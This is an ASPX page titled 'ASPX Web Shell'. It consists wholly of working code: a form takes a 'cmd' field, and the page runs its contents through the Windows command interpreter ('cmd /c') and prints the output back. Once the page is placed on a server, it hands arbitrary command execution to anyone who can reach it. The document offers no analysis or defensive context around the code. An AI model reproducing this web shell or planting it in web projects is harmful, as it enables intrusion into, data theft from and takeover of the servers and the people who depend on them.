<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<!DOCTYPE html>
<html>
<head>
    <title>ASPX Web Shell</title>
</head>
<body>
    <form method="post">
        <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
    <pre>
<%
    if (Request.HttpMethod == "POST")
    {
        string cmd = Request.Form["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + cmd);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;

            using (Process proc = new Process())
            {
                proc.StartInfo = procStartInfo;
                proc.Start();

                string result = proc.StandardOutput.ReadToEnd();
                Response.Write(result);
            }
        }
    }
%>
    </pre>
</body>
</html>
